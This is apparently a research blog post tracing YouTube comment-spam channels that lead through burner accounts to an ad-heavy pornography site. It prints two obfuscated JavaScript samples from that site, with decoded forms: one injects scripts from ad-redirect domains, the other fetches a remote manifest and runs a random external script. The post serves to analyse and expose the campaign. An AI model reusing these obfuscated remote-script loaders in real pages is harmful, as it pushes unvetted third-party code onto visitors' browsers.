---
title: YouTube Comment Bots - Research
description: Research about chain of channels that advertise pornography from YouTube comment section
date: 2026-10-15
---
## Introduction
So you go ahead and watch your favorite YouTuber,  then you scroll down to the comment section and you see a normal looking comment regarding the context of the video but the profile of the channel looks a little explicit.

Most likely if you are a man\boy you are going to like on this, hold and behold you are looking at linked channels which context either nudes or just pornography as their profile pictures.


<video
  src="/media/blogs/youtube-comment-bots/youtube-bots-overview.mp4"
  autoplay
  loop
  muted
  playsinline
  style="width:100%; border-radius:6px; border:1px solid #27272a; margin:1.5rem 0;"
/>



---

## Their tactic
### Advertisement\Outreach
They go to YouTube videos that got a lot of views or could get a lot of views, then they post a comment, seems fairly generic (https://www.youtube.com/watch?v=d_TBSxIRrYg&t=884s):

YouTube video title: `"Sony Really Screwed Up This Time..."`

The comment: `"They always forget people have free will and will find solution to any problem"` 

But the profile picture of their main account is a little explicit, which draws mostly male attention but does not violate any YouTube TOS at first, meaning this is a smart way to:
- Get a lot of free attention = **free advertisement**
- **Not get banned immediately**


### Channel hierarchy (evasion)
Once you go to their main channel , there is no pornography link in their bio (about section) but they do have a linked channel which contains either a nude profile picture or pornography which is indeed against YouTube TOS, once you click on that channel you could be met up with even more linked channels like so which do contain links to pornography websites.


![tactic-overview](/media/blogs/youtube-comment-bots/tactic-overview.png)

This means that their main channel could survive more time since its not as obvious to YouTube that it violates their TOS, but the other channels do, meaning the people who operate this treat them as burner accounts and replace them with new ones once they get banned, and just link them to the main channel.
#### Timeline
The video from my example was posted on 10.10.2026, the main channel was also created on that day and then commented on the video.

The burner channels were created on that day and going forward, since some of them got banned along the way.

The main account unlike the burners, survived about 5 days, which once again, is free advertisements.

---
When researching about them, I came across *Harender Singh's* LinkedIn post : https://www.linkedin.com/posts/singhharender_i-followed-those-weird-youtube-spam-bots-share-7492390548184666113-NXUU/

Which contained the domain of one of the channel's links: `nicefap[.]fun`, which is the domain I mostly saw at the time of research.

In his article https://medium.com/@MysteriousImmature/i-followed-those-weird-youtube-spam-bots-heres-where-they-actually-go-7023ff100c13 he basically said that its mostly an advertisement campaign to these sites, which allow a lot of HTTP redirect chain to sketchy Infrastructure (ads).

From his testing from the article `ANY.RUN Task 1` , both he and I got the same result, as to we got banned from their site, which is most likely a mechanism that **does not allow proxy to access their site**. 
This is true to both Firefox VPN and Proton VPN.


## Their Infrastructure

Their domain age is fairly new, 2 months and located in USA.

This could indicate that its a throw away domain but not provable.

From `urlquery.net` report:
https://urlquery.net/report/e402edbd-6f47-4ded-83e3-404ce2191966

We can gather more interesting information regarding the website.
The same as what *Harender Singh* said in his article, the website contains a hook which is to choose an option (of women) and then continue with basic low effort interaction to keep the person engaging for longer, all of this with one of the main goals of pushing a lot of ads.

The main website `nicefap.fun`, contains profiles for example:
- `nicefap.fun/7j8pqlnjpo0bg`
- `nicefap.fun/zngsly7k5gs1n`
- `nicefap.fun/dhbjxmoffhnc`
- And so on..
These are the links that the burner channels contain in their about section.

Both the domain and its paths redirect to a lot of other pornography and suspicious websites:

![redirect-preview](/media/blogs/youtube-comment-bots/redirect-preview.png)

From the domain graph:
![domain-graph](/media/blogs/youtube-comment-bots/domain-graph.png)
We can see that they interact with domains that know as malicious.
For example: 
- `waterloggedkind.com` - is a malicious domain primarily used as an ad server, redirect destination, and pop-up network
- `effectivecpmnetwork.com` - is an online advertising and redirection domain commonly flagged in security analyses as associated with ad networks, pop-ups, or potentially malicious traffic.

They use obfuscation in order to try and hide these domains and code which is indeed suspicious:

URL: `superfap.icu/`
JavaScript:
```js
document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8vcGwzMDEzMDMwNS5lZmZlY3RpdmVjcG1uZXR3b3JrLmNvbS85NS8yNi8zMi85NTI2MzI2ZWFkODA4NGEwZmZjZDAxMzNlOTViNzEyNi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQ+CihmdW5jdGlvbihjYm1iKXsKdmFyIGQgPSBkb2N1bWVudCwKICAgIHMgPSBkLmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpLAogICAgbCA9IGQuc2NyaXB0c1tkLnNjcmlwdHMubGVuZ3RoIC0gMV07CnMuc2V0dGluZ3MgPSBjYm1iIHx8IHt9OwpzLnNyYyA9ICJcL1wvd2F0ZXJsb2dnZWRraW5kLmNvbVwvY0FEejkuNlwvYlwvMlA1ZGxFUy1XWFFCOUFOd3pcL0V2MU5OTXptTXJ4QU1ieVwvMFwvM1lNaFQtVVEzbk1ZelJFWDNtIjsKcy5hc3luYyA9IHRydWU7CnMucmVmZXJyZXJQb2xpY3kgPSAnbm8tcmVmZXJyZXItd2hlbi1kb3duZ3JhZGUnOwpsLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHMsIGwpOwp9KSh7fSkKPC9zY3JpcHQ+Cg=="));
```
Decoded:
```
<script src="https://pl30130305.effectivecpmnetwork.com/95/26/32/9526326ead8084a0ffcd0133e95b7126.js"></script>
<script>
(function(cbmb){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = cbmb || {};
s.src = "\/\/waterloggedkind.com\/cADz9.6\/b\/2P5dlES-WXQB9ANwz\/Ev1NNMzmMrxAMby\/0\/3YMhT-UQ3nMYzREX3m";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})
</script>

```
Hiding `effectivecpmnetwork.com`.

A very strange JavaScript that fetches from GitHub a `json` file that contains most likely a list of URLs, which the script chooses randomly one of them and executes on runtime for the client, the JavaScript indicates that its another method of showing ads.

URL: `cdrrnywfkfk3b44h.public.blob.vercel-storage.com/jsback.js`
```js
(async () => {
    const mAnifesTUrls = ['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0thaVNvS2VpL3J0L3JlZnMvaGVhZHMvbWFpbi9tYW5pZmVzdC5qc29u'];
    // Function to fetch manifest and get a random script URL
    const gEtRanDomScrIpt = async (uRlS) => {
        try {
            const rEsPonse = await window["fetch"](atob(uRlS[0x0]));
            if (!rEsPonse["ok"]) return null;
            const mAniFest = await rEsPonse["json"]();
            
            if (mAniFest && Array["isArray"](mAniFest["scripts"]) && mAniFest["scripts"]["length"] > 0x0) {
                const rAnDomInDex = Math["floor"](Math["random"]() * mAniFest["scripts"]["length"]);
                return mAniFest["scripts"][rAnDomInDex]["url"];
            }
        } catch (e) {
            console["error"]('Failed to fetch or parse manifest:', e);
            return null;
        }
        return null;
    };
    const sCriPtSRc = await gEtRanDomScrIpt(mAnifesTUrls);

    if (!sCriPtSRc) {
        console["error"]("Could not retrieve a valid script URL from the manifest.");
        return;
    }
    const sRt = document["createElement"]("script");
    sRt["src"] = sCriPtSRc;
    sRt.onload = ()=>{
        createPopAdSimulator(globalConfigs.popAds);
    }

    document["head"]["appendChild"](sRt);
})();
```

Decoded: `https://raw.githubusercontent.com/KaiSoKei/rt/refs/heads/main/manifest.json`

## Conclusion
YouTube has to do a better job at detecting such matters, especially when the main account survived for so long, and even gained 500+ likes.

Thank you for reading, hope you enjoyed !!